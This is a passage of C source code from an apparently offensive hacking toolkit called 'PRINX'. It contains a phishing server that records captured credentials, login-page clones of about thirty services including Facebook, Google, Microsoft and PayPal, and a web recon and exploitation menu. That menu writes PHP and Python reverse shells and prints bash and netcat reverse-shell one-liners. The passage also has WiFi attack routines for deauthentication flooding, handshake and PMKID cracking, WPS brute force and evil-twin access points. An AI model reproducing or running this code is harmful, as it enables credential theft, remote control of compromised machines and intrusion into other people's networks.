    print_success("════════════════════════════════════════════════\n");
    
    /* Set non-blocking for stdin check */
    int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);
    
    fd_set readfds;
    struct timeval tv;
    
    while (server_running) {
        FD_ZERO(&readfds);
        FD_SET(server_fd, &readfds);
        
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        
        int activity = select(server_fd + 1, &readfds, NULL, NULL, &tv);
        
        if (activity < 0 && errno != EINTR) {
            print_error("Select error: %s", strerror(errno));
            break;
        }
        
        /* Check for quit command */
        char ch;
        if (read(STDIN_FILENO, &ch, 1) > 0) {
            if (ch == 'q' || ch == 'Q') {
                print_info("Stopping server...");
                break;
            }
        }
        
        if (FD_ISSET(server_fd, &readfds)) {
            struct sockaddr_in client_addr;
            socklen_t client_len = sizeof(client_addr);
            int client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
            
            if (client_fd >= 0) {
                ServerArg *arg = safe_malloc(sizeof(ServerArg));
                arg->socket_fd = client_fd;
                arg->address = client_addr;
                arg->template_idx = template_idx;
                arg->request_id = total_requests;
                arg->connection_time = time(NULL);
                arg->client_port = ntohs(client_addr.sin_port);
                strncpy(arg->client_ip, inet_ntoa(client_addr.sin_addr), 63);
                
                pthread_t thread;
                if (pthread_create(&thread, NULL, phish_handle_connection, arg) == 0) {
                    pthread_detach(thread);
                } else {
                    free(arg);
                    close(client_fd);
                }
            }
        }
    }
    
    /* Restore stdin blocking */
    fcntl(STDIN_FILENO, F_SETFL, flags);
    
    server_running = 0;
    close(server_fd);
    
    print_info("Server stopped.");
    printf("  Total Requests: %d\n", total_requests);
    printf("  Captured Credentials: %d\n", total_creds);
    
    /* Auto-save */
    if (total_creds > 0) {
        char path[MAX_PATH];
        snprintf(path, sizeof(path), "%s/creds_%s.json", LOG_DIR, get_date());
        create_dir(LOG_DIR);
        export_credentials_json(path);
    }
}

/* ====================================================================================================
 * SECTION 10: TEMPLATE INITIALIZATION (30 Templates)
 * ==================================================================================================== */

void init_all_templates(void) {
    template_count = 0;
    
    /* Template 1: Facebook */
    strcpy(templates[template_count].name, "facebook");
    strcpy(templates[template_count].category, "Social Media");
    strcpy(templates[template_count].description, "Facebook login page - Ultra detailed clone");
    strcpy(templates[template_count].html, TEMPLATE_FACEBOOK);
    strcpy(templates[template_count].redirect_url, "https://www.facebook.com/");
    strcpy(templates[template_count].original_domain, "facebook.com");
    strcpy(templates[template_count].username_field, "email");
    strcpy(templates[template_count].password_field, "pass");
    strcpy(templates[template_count].email_field, "email");
    templates[template_count].popularity = 100;
    templates[template_count].is_active = 1;
    templates[template_count].html_length = strlen(TEMPLATE_FACEBOOK);
    template_count++;
    
    /* Template 2: Instagram */
    strcpy(templates[template_count].name, "instagram");
    strcpy(templates[template_count].category, "Social Media");
    strcpy(templates[template_count].description, "Instagram login page - Ultra detailed clone");
    strcpy(templates[template_count].html, TEMPLATE_INSTAGRAM);
    strcpy(templates[template_count].redirect_url, "https://www.instagram.com/");
    strcpy(templates[template_count].original_domain, "instagram.com");
    strcpy(templates[template_count].username_field, "username");
    strcpy(templates[template_count].password_field, "password");
    templates[template_count].popularity = 97;
    templates[template_count].is_active = 1;
    templates[template_count].html_length = strlen(TEMPLATE_INSTAGRAM);
    template_count++;
    
    /* Template 3: Google */
    strcpy(templates[template_count].name, "google");
    strcpy(templates[template_count].category, "Email / Tech");
    strcpy(templates[template_count].description, "Google sign-in page - Material Design clone");
    strcpy(templates[template_count].html, TEMPLATE_GOOGLE);
    strcpy(templates[template_count].redirect_url, "https://accounts.google.com/");
    strcpy(templates[template_count].original_domain, "google.com");
    strcpy(templates[template_count].username_field, "email");
    strcpy(templates[template_count].password_field, "password");
    strcpy(templates[template_count].email_field, "email");
    templates[template_count].popularity = 99;
    templates[template_count].is_active = 1;
    templates[template_count].html_length = strlen(TEMPLATE_GOOGLE);
    template_count++;
    
    /* Template 4: Twitter/X */
    strcpy(templates[template_count].name, "twitter");
    strcpy(templates[template_count].category, "Social Media");
    strcpy(templates[template_count].description, "X (Twitter) login page - Dark theme clone");
    strcpy(templates[template_count].html, TEMPLATE_TWITTER);
    strcpy(templates[template_count].redirect_url, "https://twitter.com/");
    strcpy(templates[template_count].original_domain, "twitter.com");
    strcpy(templates[template_count].username_field, "text");
    strcpy(templates[template_count].password_field, "password");
    templates[template_count].popularity = 95;
    templates[template_count].is_active = 1;
    templates[template_count].html_length = strlen(TEMPLATE_TWITTER);
    template_count++;
    
    /* Template 5: Microsoft */
    strcpy(templates[template_count].name, "microsoft");
    strcpy(templates[template_count].category, "Corporate / Tech");
    strcpy(templates[template_count].description, "Microsoft login page - Corporate style clone");
    strcpy(templates[template_count].html, TEMPLATE_MICROSOFT);
    strcpy(templates[template_count].redirect_url, "https://login.live.com/");
    strcpy(templates[template_count].original_domain, "microsoft.com");
    strcpy(templates[template_count].username_field, "login");
    strcpy(templates[template_count].password_field, "passwd");
    strcpy(templates[template_count].email_field, "login");
    templates[template_count].popularity = 94;
    templates[template_count].is_active = 1;
    templates[template_count].html_length = strlen(TEMPLATE_MICROSOFT);
    template_count++;
    
    /* Templates 6-30 */
    const char *names[] = {
        "whatsapp", "spotify", "paypal", "linkedin", "tiktok",
        "snapchat", "apple", "amazon", "netflix", "github",
        "yahoo", "reddit", "discord", "telegram", "signal",
        "mega", "dropbox", "icloud", "office365", "oracle",
        "adobe", "salesforce", "zoom", "slack", "twitch"
    };
    
    const char *categories[] = {
        "Messaging", "Music", "Finance", "Professional", "Social Media",
        "Social Media", "Tech", "E-commerce", "Entertainment", "Development",
        "Email", "Social Media", "Gaming", "Messaging", "Messaging",
        "Cloud Storage", "Cloud Storage", "Cloud", "Productivity", "Corporate",
        "Creative", "CRM", "Video Conferencing", "Productivity", "Gaming"
    };
    
    const char *descriptions[] = {
        "WhatsApp Web login clone", "Spotify music streaming login clone",
        "PayPal payment login clone", "LinkedIn professional network login clone",
        "TikTok short video login clone", "Snapchat social media login clone",
        "Apple ID authentication clone", "Amazon shopping login clone",
        "Netflix streaming login clone", "GitHub developer platform login clone",
        "Yahoo Mail login clone", "Reddit forum login clone",
        "Discord gaming chat login clone", "Telegram messaging login clone",
        "Signal private messaging login clone", "Mega cloud storage login clone",
        "Dropbox file sharing login clone", "iCloud Apple cloud login clone",
        "Office 365 productivity login clone", "Oracle enterprise login clone",
        "Adobe Creative Cloud login clone", "Salesforce CRM login clone",
        "Zoom video conferencing login clone", "Slack workspace login clone",
        "Twitch game streaming login clone"
    };
    
    for (int i = 0; i < 25 && template_count < MAX_TEMPLATES; i++) {
        strcpy(templates[template_count].name, names[i]);
        strcpy(templates[template_count].category, categories[i]);
        strcpy(templates[template_count].description, descriptions[i]);
        
        /* Generate generic but styled HTML */
        snprintf(templates[template_count].html, MAX_HTML,
            "<!DOCTYPE html>\n<html lang='en'>\n<head>\n"
            "<meta charset='UTF-8'>\n"
            "<meta name='viewport' content='width=device-width, initial-scale=1.0'>\n"
            "<title>%s - Sign In</title>\n"
            "<style>\n"
            "*{margin:0;padding:0;box-sizing:border-box}\n"
            "body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%%,#764ba2 100%%);display:flex;justify-content:center;align-items:center;min-height:100vh}\n"
            ".login-container{background:rgba(255,255,255,0.95);padding:40px;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.3);width:100%%;max-width:400px;text-align:center}\n"
            ".logo{font-size:36px;font-weight:bold;color:#333;margin-bottom:24px;text-transform:capitalize}\n"
            ".subtitle{color:#666;font-size:14px;margin-bottom:32px}\n"
            "input{width:100%%;padding:14px 16px;margin:10px 0;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;transition:all 0.3s;outline:none}\n"
            "input:focus{border-color:#667eea;box-shadow:0 0 0 4px rgba(102,126,234,0.15)}\n"
            ".signin-btn{width:100%%;padding:14px;background:linear-gradient(135deg,#667eea 0%%,#764ba2 100%%);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;margin:24px 0;transition:transform 0.2s,box-shadow 0.2s}\n"
            ".signin-btn:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(102,126,234,0.4)}\n"
            ".signin-btn:active{transform:translateY(0)}\n"
            ".forgot-link{color:#667eea;text-decoration:none;font-size:14px;display:block;margin-top:16px}\n"
            ".forgot-link:hover{text-decoration:underline}\n"
            ".signup-text{color:#666;font-size:14px;margin-top:24px}\n"
            ".signup-text a{color:#667eea;text-decoration:none;font-weight:bold}\n"
            ".signup-text a:hover{text-decoration:underline}\n"
            "</style>\n</head>\n<body>\n"
            "<div class='login-container'>\n"
            "<div class='logo'>%s</div>\n"
            "<p class='subtitle'>Sign in to your %s account</p>\n"
            "<form method='POST' action='/login'>\n"
            "<input type='text' name='username' placeholder='Email or username' required autocomplete='username'>\n"
            "<input type='password' name='password' placeholder='Password' required autocomplete='current-password'>\n"
            "<button type='submit' class='signin-btn'>Sign In</button>\n"
            "</form>\n"
            "<a href='#' class='forgot-link'>Forgot password?</a>\n"
            "<p class='signup-text'>Don't have an account? <a href='#'>Sign up</a></p>\n"
            "</div>\n</body>\n</html>",
            names[i], names[i], names[i]);
        
        snprintf(templates[template_count].redirect_url, MAX_URL, "https://www.%s.com/", names[i]);
        snprintf(templates[template_count].original_domain, 128, "%s.com", names[i]);
        strcpy(templates[template_count].username_field, "username");
        strcpy(templates[template_count].password_field, "password");
        templates[template_count].popularity = 90 - (i * 2);
        templates[template_count].is_active = 1;
        templates[template_count].html_length = strlen(templates[template_count].html);
        snprintf(templates[template_count].login_url, MAX_URL, "/login");
        template_count++;
    }
    
    print_success("Initialized %d phishing templates", template_count);
}

/* ====================================================================================================
 * SECTION 11: FWEBFM MODULE FUNCTIONS
 * ==================================================================================================== */

void fwebfm_amass(void) {
    char cmd[MAX_BUFFER];
    if (!strlen(config.target)) get_input("Target domain: ", config.target, sizeof(config.target));
    create_dir(config.output_dir);
    snprintf(cmd, sizeof(cmd), "amass enum -d %s -o %s/amass_output.txt 2>/dev/null",
             config.target, config.output_dir);
    run_cmd(cmd);
    print_success("Amass enumeration completed");
}

void fwebfm_whatweb(void) {
    char cmd[MAX_BUFFER];
    if (!strlen(config.target)) get_input("Target URL: ", config.target, sizeof(config.target));
    create_dir(config.output_dir);
    snprintf(cmd, sizeof(cmd), "whatweb %s -a 3 > %s/whatweb_output.txt 2>/dev/null",
             config.target, config.output_dir);
    run_cmd(cmd);
    print_success("WhatWeb scan completed");
}

void fwebfm_nmap(void) {
    char cmd[MAX_BUFFER];
    if (!strlen(config.target)) get_input("Target IP/Domain: ", config.target, sizeof(config.target));
    create_dir(config.output_dir);
    snprintf(cmd, sizeof(cmd), 
             "nmap -sV -sC -T4 -p- --min-rate 1000 --max-retries 3 -oN %s/nmap_scan.txt %s",
             config.output_dir, config.target);
    run_cmd(cmd);
    print_success("Nmap scan completed");
}

void fwebfm_httpx(void) {
    char cmd[MAX_BUFFER];
    if (!strlen(config.target)) get_input("Target URL: ", config.target, sizeof(config.target));
    create_dir(config.output_dir);
    snprintf(cmd, sizeof(cmd), 
             "echo '%s' | httpx -status-code -title -tech-detect -server -content-length -o %s/httpx_output.txt",
             config.target, config.output_dir);
    run_cmd(cmd);
    print_success("Httpx probe completed");
}

void fwebfm_sublist3r(void) {
    char cmd[MAX_BUFFER];
    if (!strlen(config.target)) get_input("Target domain: ", config.target, sizeof(config.target));
    create_dir(config.output_dir);
    snprintf(cmd, sizeof(cmd), "sublist3r -d %s -o %s/sublist3r_output.txt 2>/dev/null",
             config.target, config.output_dir);
    run_cmd(cmd);
    print_success("Sublist3r enumeration completed");
}

void fwebfm_waybackurls(void) {
    char cmd[MAX_BUFFER];
    if (!strlen(config.target)) get_input("Target domain: ", config.target, sizeof(config.target));
    create_dir(config.output_dir);
    snprintf(cmd, sizeof(cmd), "waybackurls %s > %s/wayback_output.txt 2>/dev/null",
             config.target, config.output_dir);
    run_cmd(cmd);
    print_success("Waybackurls extraction completed");
}

void fwebfm_gau(void) {
    char cmd[MAX_BUFFER];
    if (!strlen(config.target)) get_input("Target domain: ", config.target, sizeof(config.target));
    create_dir(config.output_dir);
    snprintf(cmd, sizeof(cmd), "gau %s --subs > %s/gau_output.txt 2>/dev/null",
             config.target, config.output_dir);
    run_cmd(cmd);
    print_success("Gau URL extraction completed");
}

void fwebfm_gobuster(void) {
    char cmd[MAX_BUFFER * 2];
    if (!strlen(config.target)) get_input("Target URL (with https://): ", config.target, sizeof(config.target));
    create_dir(config.output_dir);
    snprintf(cmd, sizeof(cmd), 
             "gobuster dir -u %s -w %s -t %d -x php,html,txt,js,bak,zip,tar,gz,sql,db -o %s/gobuster_output.txt",
             config.target, config.wordlist, config.threads, config.output_dir);
    run_cmd(cmd);
    print_success("Gobuster directory bruteforce completed");
}

void fwebfm_ffuf(void) {
    char cmd[MAX_BUFFER * 2];
    if (!strlen(config.target)) get_input("Target URL (with FUZZ placeholder): ", config.target, sizeof(config.target));
    create_dir(config.output_dir);
    snprintf(cmd, sizeof(cmd),
             "ffuf -u %s -w %s -t %d -mc 200,201,202,203,204,301,302,307,401,403,405 -o %s/ffuf_output.json -of json",
             config.target, config.wordlist, config.threads, config.output_dir);
    run_cmd(cmd);
    print_success("FFUF fuzzing completed");
}

void fwebfm_dirsearch(void) {
    char cmd[MAX_BUFFER];
    if (!strlen(config.target)) get_input("Target URL: ", config.target, sizeof(config.target));
    create_dir(config.output_dir);
    snprintf(cmd, sizeof(cmd),
             "dirsearch -u %s -e php,html,txt,js,zip,tar,gz,sql,db,bak,conf,log -t %d -o %s/dirsearch_output.txt --format=plain",
             config.target, config.threads, config.output_dir);
    run_cmd(cmd);
    print_success("Dirsearch completed");
}

void fwebfm_nikto(void) {
    char cmd[MAX_BUFFER];
    if (!strlen(config.target)) get_input("Target URL: ", config.target, sizeof(config.target));
    create_dir(config.output_dir);
    snprintf(cmd, sizeof(cmd),
             "nikto -h %s -Tuning 123456789 -o %s/nikto_output.txt -Format txt 2>/dev/null",
             config.target, config.output_dir);
    run_cmd(cmd);
    print_success("Nikto vulnerability scan completed");
}

void fwebfm_nuclei(void) {
    char cmd[MAX_BUFFER];
    if (!strlen(config.target)) get_input("Target URL: ", config.target, sizeof(config.target));
    create_dir(config.output_dir);
    snprintf(cmd, sizeof(cmd),
             "nuclei -u %s -t ~/nuclei-templates/ -severity critical,high,medium,low -o %s/nuclei_output.txt -silent",
             config.target, config.output_dir);
    run_cmd(cmd);
    print_success("Nuclei template scan completed");
}

void fwebfm_sqlmap(void) {
    char cmd[MAX_BUFFER], sql_url[MAX_URL];
    get_input("URL with parameter (e.g., http://target.com/page.php?id=1): ", sql_url, sizeof(sql_url));
    create_dir(config.output_dir);
    snprintf(cmd, sizeof(cmd),
             "sqlmap -u \"%s\" --batch --level=3 --risk=2 --random-agent --output-dir=%s/sqlmap --threads=%d",
             sql_url, config.output_dir, config.threads > 10 ? 10 : config.threads);
    run_cmd(cmd);
    print_success("SQLMap injection test completed");
}

void fwebfm_searchsploit(void) {
    char cmd[MAX_BUFFER], keyword[256];
    get_input("Search keyword: ", keyword, sizeof(keyword));
    create_dir(config.output_dir);
    snprintf(cmd, sizeof(cmd),
             "searchsploit %s -t -w > %s/searchsploit_output.txt 2>/dev/null",
             keyword, config.output_dir);
    run_cmd(cmd);
    print_success("Searchsploit search completed");
}

void fwebfm_generate_php_shell(void) {
    if (!strlen(config.lhost)) get_input("LHOST (your IP): ", config.lhost, sizeof(config.lhost));
    if (!strlen(config.lport)) get_input("LPORT: ", config.lport, sizeof(config.lport));
    
    create_dir(PAYLOAD_DIR);
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s/prinx_shell.php", PAYLOAD_DIR);
    
    FILE *fp = fopen(path, "w");
    if (fp) {
        fprintf(fp, "<?php\n");
        fprintf(fp, "// PRINX PHP Reverse Shell\n");
        fprintf(fp, "set_time_limit(0);\n");
        fprintf(fp, "$ip = '%s';\n", config.lhost);
        fprintf(fp, "$port = %s;\n", config.lport);
        fprintf(fp, "$sock = fsockopen($ip, $port, $errno, $errstr, 30);\n");
        fprintf(fp, "if (!$sock) { die(\"[$errno] $errstr\"); }\n");
        fprintf(fp, "$descriptorspec = array(\n");
        fprintf(fp, "    0 => array(\"pipe\", \"r\"),  // stdin\n");
        fprintf(fp, "    1 => array(\"pipe\", \"w\"),  // stdout\n");
        fprintf(fp, "    2 => array(\"pipe\", \"w\")   // stderr\n");
        fprintf(fp, ");\n");
        fprintf(fp, "$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);\n");
        fprintf(fp, "if (is_resource($process)) {\n");
        fprintf(fp, "    stream_copy_to_stream($sock, $pipes[0]);\n");
        fprintf(fp, "    stream_copy_to_stream($pipes[1], $sock);\n");
        fprintf(fp, "    stream_copy_to_stream($pipes[2], $sock);\n");
        fprintf(fp, "    fclose($pipes[0]);\n");
        fprintf(fp, "    fclose($pipes[1]);\n");
        fprintf(fp, "    fclose($pipes[2]);\n");
        fprintf(fp, "    proc_close($process);\n");
        fprintf(fp, "}\n");
        fprintf(fp, "fclose($sock);\n");
        fprintf(fp, "?>\n");
        fclose(fp);
        print_success("PHP reverse shell created: %s", path);
    }
}

void fwebfm_generate_python_shell(void) {
    if (!strlen(config.lhost)) get_input("LHOST: ", config.lhost, sizeof(config.lhost));
    if (!strlen(config.lport)) get_input("LPORT: ", config.lport, sizeof(config.lport));
    
    create_dir(PAYLOAD_DIR);
    char path[MAX_PATH];
    snprintf(path, sizeof(path), "%s/prinx_shell.py", PAYLOAD_DIR);
    
    FILE *fp = fopen(path, "w");
    if (fp) {
        fprintf(fp, "#!/usr/bin/env python3\n");
        fprintf(fp, "# PRINX Python Reverse Shell\n");
        fprintf(fp, "import socket,subprocess,os,pty\n");
        fprintf(fp, "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n");
        fprintf(fp, "s.connect(('%s',%s))\n", config.lhost, config.lport);
        fprintf(fp, "os.dup2(s.fileno(),0)\n");
        fprintf(fp, "os.dup2(s.fileno(),1)\n");
        fprintf(fp, "os.dup2(s.fileno(),2)\n");
        fprintf(fp, "pty.spawn('/bin/bash')\n");
        fclose(fp);
        print_success("Python reverse shell created: %s", path);
    }
}

void fwebfm_generate_bash_shell(void) {
    if (!strlen(config.lhost)) get_input("LHOST: ", config.lhost, sizeof(config.lhost));
    if (!strlen(config.lport)) get_input("LPORT: ", config.lport, sizeof(config.lport));
    
    print_header("BASH REVERSE SHELL PAYLOADS");
    printf(GREEN "1. bash -i >& /dev/tcp/%s/%s 0>&1\n" NC, config.lhost, config.lport);
    printf(GREEN "2. 0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196\n" NC, config.lhost, config.lport);
    printf(GREEN "3. rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f\n" NC, config.lhost, config.lport);
    printf(GREEN "4. nc -e /bin/sh %s %s\n" NC, config.lhost, config.lport);
    printf(GREEN "5. php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n" NC, config.lhost, config.lport);
}

void fwebfm_start_nc_listener(void) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "nc -lvnp %s", config.lport);
    print_info("Starting Netcat listener on port %s...", config.lport);
    run_cmd(cmd);
}

void fwebfm_full_recon(void) {
    print_warning("Starting FULL reconnaissance on target: %s", config.target);
    if (!confirm_action("This will run ALL recon tools. Continue?")) return;
    
    print_header("PHASE 1: SUBDOMAIN ENUMERATION");
    fwebfm_amass();
    fwebfm_sublist3r();
    
    print_header("PHASE 2: TECHNOLOGY DETECTION");
    fwebfm_whatweb();
    fwebfm_httpx();
    
    print_header("PHASE 3: PORT SCANNING");
    fwebfm_nmap();
    
    print_header("PHASE 4: URL DISCOVERY");
    fwebfm_waybackurls();
    fwebfm_gau();
    
    print_header("PHASE 5: DIRECTORY BRUTEFORCE");
    fwebfm_gobuster();
    fwebfm_dirsearch();
    
    print_header("PHASE 6: VULNERABILITY SCANNING");
    fwebfm_nikto();
    fwebfm_nuclei();
    
    print_success("FULL RECONNAISSANCE COMPLETED!");
    printf("  Results saved in: %s/\n", config.output_dir);
}

/* ====================================================================================================
 * SECTION 12: WIFI MODULE FUNCTIONS
 * ==================================================================================================== */

void wifi_enable_monitor_mode(void) {
    char cmd[256];
    if (!strlen(config.interface)) get_input("Interface (e.g., wlan0): ", config.interface, sizeof(config.interface));
    
    print_info("Enabling monitor mode on %s...", config.interface);
    snprintf(cmd, sizeof(cmd), "airmon-ng check kill 2>/dev/null; airmon-ng start %s 2>/dev/null", config.interface);
    run_cmd(cmd);
    
    print_success("Monitor mode should be enabled");
    printf("  Check with: iwconfig %smon\n", config.interface);
}

void wifi_scan_networks(void) {
    char cmd[256];
    if (!strlen(config.interface)) get_input("Monitor interface (e.g., wlan0mon): ", config.interface, sizeof(config.interface));
    
    print_info("Scanning WiFi networks... (Press Ctrl+C to stop)");
    snprintf(cmd, sizeof(cmd), "airodump-ng %smon 2>/dev/null", config.interface);
    run_cmd(cmd);
}

void wifi_deauth_flood(void) {
    char cmd[256];
    if (!strlen(config.bssid)) get_input("Target BSSID: ", config.bssid, sizeof(config.bssid));
    if (!strlen(config.interface)) get_input("Monitor interface: ", config.interface, sizeof(config.interface));
    
    print_warning("Starting DEAUTH FLOOD on %s", config.bssid);
    print_warning("Press Ctrl+C to stop!");
    snprintf(cmd, sizeof(cmd), "aireplay-ng -0 0 -a %s %smon", config.bssid, config.interface);
    run_cmd(cmd);
}

void wifi_capture_handshake(void) {
    char cmd[256];
    if (!strlen(config.bssid)) get_input("Target BSSID: ", config.bssid, sizeof(config.bssid));
    if (!strlen(config.channel)) get_input("Channel: ", config.channel, sizeof(config.channel));
    if (!strlen(config.interface)) get_input("Monitor interface: ", config.interface, sizeof(config.interface));
    
    print_info("Capturing WPA handshake... (Wait for client connection)");
    snprintf(cmd, sizeof(cmd), "airodump-ng %smon -c %s --bssid %s -w prinx_handshake",
             config.interface, config.channel, config.bssid);
    run_cmd(cmd);
    
    if (file_exists("prinx_handshake-01.cap")) {
        print_info("Handshake captured! Attempting crack...");
        run_cmd("aircrack-ng -w /usr/share/wordlists/rockyou.txt prinx_handshake-01.cap");
    }
}

void wifi_pmkid_attack(void) {
    char cmd[256];
    if (!strlen(config.bssid)) get_input("Target BSSID: ", config.bssid, sizeof(config.bssid));
    if (!strlen(config.interface)) get_input("Monitor interface: ", config.interface, sizeof(config.interface));
    
    print_info("Step 1: Capturing PMKID...");
    snprintf(cmd, sizeof(cmd), "hcxdumptool -i %smon --filterlist_ap=%s -o prinx_pmkid.pcapng --enable_status=1 2>/dev/null",
             config.interface, config.bssid);
    run_cmd(cmd);
    
    if (file_exists("prinx_pmkid.pcapng")) {
        print_info("Step 2: Converting to hash...");
        run_cmd("hcxpcapngtool -o prinx_hash.hc22000 prinx_pmkid.pcapng 2>/dev/null");
        
        if (file_exists("prinx_hash.hc22000")) {
            print_info("Step 3: Cracking with Hashcat...");
            run_cmd("hashcat -m 22000 prinx_hash.hc22000 /usr/share/wordlists/rockyou.txt --force --status");
        }
    }
}

void wifi_wps_attack(void) {
    char cmd[256];
    if (!strlen(config.bssid)) get_input("Target BSSID: ", config.bssid, sizeof(config.bssid));
    if (!strlen(config.interface)) get_input("Monitor interface: ", config.interface, sizeof(config.interface));
    
    print_info("Starting WPS PIN brute force... (This may take hours)");
    snprintf(cmd, sizeof(cmd), "reaver -i %smon -b %s -vv -d 0 -t 1 -N -w 300 -r 3:10",
             config.interface, config.bssid);
    run_cmd(cmd);
}

void wifi_evil_twin(void) {
    char cmd[256];
    if (!strlen(config.bssid)) get_input("Target BSSID: ", config.bssid, sizeof(config.bssid));
    if (!strlen(config.channel)) get_input("Channel: ", config.channel, sizeof(config.channel));
    if (!strlen(config.essid)) get_input("ESSID: ", config.essid, sizeof(config.essid));
    if (!strlen(config.interface)) get_input("Monitor interface: ", config.interface, sizeof(config.interface));
    
    print_warning("Creating Evil Twin AP: %s", config.essid);
    snprintf(cmd, sizeof(cmd), "airbase-ng -a %s --essid \"%s\" -c %s %smon",
             config.bssid, config.essid, config.channel, config.interface);
    run_cmd(cmd);
}

void wifi_info(void) {
    print_header("WIRELESS INTERFACE INFORMATION");
    run_cmd("iwconfig 2>/dev/null");
    printf("\n");
    run_cmd("ip addr show 2>/dev/null | grep -E '^[0-9]+:|inet '");
    printf("\n");
    run_cmd("iwlist scan 2>/dev/null | grep -E 'Cell|ESSID|Channel|Encryption|Quality' | head -40");
}

/* ====================================================================================================
 * SECTION 13: MENU SYSTEMS
 * ==================================================================================================== */

void fwebfm_menu(void) {
    snprintf(config.output_dir, sizeof(config.output_dir), "%s/fwebfm_%s", OUTPUT_DIR, get_date());
    create_dir(config.output_dir);
    create_dir(PAYLOAD_DIR);
    
    int choice;
    do {
        clear_screen();
        print_banner();
        printf(BOLD GREEN "╔═════════════════════ FWEBFM MODULE ═════════════════════╗\n" NC);
        printf("║ Target : %-46s ║\n", strlen(config.target) ? config.target : "(not set)");
        printf("║ Output : %-46s ║\n", config.output_dir);
        printf("║ LHOST  : %-16s LPORT : %-6s              ║\n", config.lhost, config.lport);
        printf(BOLD GREEN "╠════════════════════════════════════════════════════════╣\n" NC);
        printf("║ " CYAN "[1]  Reconnaissance (7 tools)       " NC "               ║\n");
        printf("║ " CYAN "[2]  Discovery (4 tools)            " NC "               ║\n");
        printf("║ " CYAN "[3]  Vulnerability Scanning (4 tools)" NC "               ║\n");
        printf("║ " CYAN "[4]  Exploitation (Shells, Listeners)" NC "              ║\n");
        printf("║ " CYAN "[5]  FULL AUTO RECON (All Phases)   " NC "               ║\n");
        printf("║ " CYAN "[6]  Generate HTML Report           " NC "               ║\n");
        printf("║ " CYAN "[7]  Export Results to JSON         " NC "               ║\n");
        printf("║ " RED  "[0]  Back to Main Menu             " NC "               ║\n");
        printf(BOLD GREEN "╚════════════════════════════════════════════════════════╝\n" NC);
        printf(CYAN "\n[FWEBFM] > " NC);
        scanf("%d", &choice);
        getchar();
        
        switch(choice) {
            case 1: {
                int sub;
                do {
                    printf("\n" GREEN "[Recon] 1=Amass 2=WhatWeb 3=Nmap 4=Httpx 5=Sublist3r 6=Waybackurls 7=Gau 0=Back\n" NC);
                    printf(CYAN "[Recon] > " NC);
                    scanf("%d", &sub); getchar();
                    if (sub == 1) { fwebfm_amass(); wait_enter(); }
                    else if (sub == 2) { fwebfm_whatweb(); wait_enter(); }
                    else if (sub == 3) { fwebfm_nmap(); wait_enter(); }
                    else if (sub == 4) { fwebfm_httpx(); wait_enter(); }
                    else if (sub == 5) { fwebfm_sublist3r(); wait_enter(); }
                    else if (sub == 6) { fwebfm_waybackurls(); wait_enter(); }
                    else if (sub == 7) { fwebfm_gau(); wait_enter(); }
                } while (sub != 0);
                break;
            }
            case 2: {
                int sub;
                do {
                    printf("\n" GREEN "[Discovery] 1=Gobuster 2=FFUF 3=Dirsearch 4=JS-Discovery 0=Back\n" NC);
                    printf(CYAN "[Discovery] > " NC);
                    scanf("%d", &sub); getchar();
                    if (sub == 1) { fwebfm_gobuster(); wait_enter(); }
                    else if (sub == 2) { fwebfm_ffuf(); wait_enter(); }
                    else if (sub == 3) { fwebfm_dirsearch(); wait_enter(); }
                    else if (sub == 4) { 
                        char cmd[MAX_BUFFER];
                        snprintf(cmd, sizeof(cmd), "curl -s %s | grep -o 'src=\"[^\"]*\"' | grep '.js' | tee %s/js_files.txt", 
                                 config.target, config.output_dir);
                        run_cmd(cmd);
                        wait_enter();
                    }
                } while (sub != 0);
                break;
            }
            case 3: {
                int sub;
                do {
                    printf("\n" GREEN "[Vuln] 1=Nikto 2=Nuclei 3=SQLMap 4=Searchsploit 0=Back\n" NC);
                    printf(CYAN "[Vuln] > " NC);
                    scanf("%d", &sub); getchar();
                    if (sub == 1) { fwebfm_nikto(); wait_enter(); }
                    else if (sub == 2) { fwebfm_nuclei(); wait_enter(); }
                    else if (sub == 3) { fwebfm_sqlmap(); wait_enter(); }
                    else if (sub == 4) { fwebfm_searchsploit(); wait_enter(); }
                } while (sub != 0);
                break;
            }
            case 4: {
                int sub;
                do {
                    printf("\n" GREEN "[Exploit] 1=PHP 2=Python 3=Bash 4=Netcat-Listener 5=MSF-Handler 0=Back\n" NC);
                    printf(CYAN "[Exploit] > " NC);
                    scanf("%d", &sub); getchar();
                    if (sub == 1) { fwebfm_generate_php_shell(); wait_enter(); }
                    else if (sub == 2) { fwebfm_generate_python_shell(); wait_enter(); }
                    else if (sub == 3) { fwebfm_generate_bash_shell(); wait_enter(); }
                    else if (sub == 4) { fwebfm_start_nc_listener(); }
                    else if (sub == 5) {
                        char cmd[MAX_BUFFER];
                        snprintf(cmd, sizeof(cmd),
                                 "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; exploit'",
                                 config.lhost, config.lport);
                        run_cmd(cmd);
                    }
                } while (sub != 0);
                break;
            }
            case 5: fwebfm_full_recon(); wait_enter(); break;
            case 6: {
                char path[MAX_PATH];
                snprintf(path, sizeof(path), "%s/report_%s.html", config.output_dir, get_date());
                FILE *fp = fopen(path, "w");
                if (fp) {
                    fprintf(fp, "<!DOCTYPE html><html><head><title>FWEBFM Report</title>");
                    fprintf(fp, "<style>body{background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px;}");
                    fprintf(fp, "h1{color:#ff0000;}h2{color:#ffaa00;}pre{background:#1a1a1a;padding:10px;overflow:auto;max-height:400px;}</style></head><body>");
